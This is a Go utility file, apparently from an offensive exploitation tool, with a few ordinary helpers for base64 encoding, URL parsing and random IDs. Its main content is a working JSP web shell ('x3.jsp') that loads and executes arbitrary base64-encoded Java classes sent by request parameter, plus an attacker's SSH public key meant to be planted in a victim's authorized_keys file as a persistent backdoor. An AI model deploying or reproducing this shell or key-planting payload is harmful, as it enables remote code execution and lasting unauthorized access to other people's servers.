package util

import (
	"encoding/base64"
	"math/rand"
	"net/url"
	"strings"
	"time"
)

var (
	WebShellName    = "x3.jsp"
	X3Webshell      = `<%@page import="javax.xml.bind.*,java.lang.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte[] b){return super.defineClass(b, 0, b.length);}}%><% String c = (String)request.getParameter("c");if(null==c&&null!=session)c=(String)session.getAttribute("c");if (null == c && null != application.getAttribute("_c_"))c=(String)application.getAttribute("_c_");if (null != c)try {application.setAttribute("_c_",c);new U(this.getClass().getClassLoader()).g(DatatypeConverter.parseBase64Binary(c)).newInstance().equals(pageContext);} catch (Exception e) {}%>`
	Authorized_keys = `ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCsK7OsENqLwuH6pTrCBiNWNI0ByZZURaV+TS6l2P6cxWZpRAgVruyDk+XQ5pY9xJHTZfF75IT+ekWXA5hBe2eO8j+fAQuKaHgvlV8fTp48wMS0LRilfrslOsyv8DsrDs2ZSaiaraj7BwEBalaumczqBM0UoelCa7OvWJDqfyYK8ihQBYBXui/jvyb3FdRA9muOLFuo+AmhIyL3UMQ1jhUxrpmhAKxs6oUjMFXBj//TpvYL7AZXz+2MfmApHYSBx7vs+NodAOf9WShSPoHkuzz3riIsN3hBx66gGRGOPL00lvPsu/GS31klFKaGm3qFcHvO3uczRsaUGj89d/jUwBNh root@linuxkit-025000000001`
)

func To_b64(file_byte []byte) string {
	return base64.StdEncoding.EncodeToString(file_byte)
}

func GetUrlHost(szUrl string) string {
	if oU, err := url.Parse(szUrl); nil == err {
		szUrl = oU.Scheme + "://" + oU.Host
	}
	return szUrl
}

// 生成随机id
func GeneratorId(add_time int64) string {
	var list_str = []string{}
	size := 6
	chars := "abcdefghijklmnopqrstuvwxyz"
	dights := "0123456789"
	strs := chars + dights
	zz := time.Now().Unix() + add_time
	rand.Seed(zz)

	a := int64(len(strs))
	for i := 0; i < size; i++ {
		flag := rand.Int63n(a)
		_ = flag
		list_str = append(list_str, string(strs[int(flag)]))
	}
	// res := strings.Join(s, "")
	res := strings.Join(list_str, "")
	return res
}
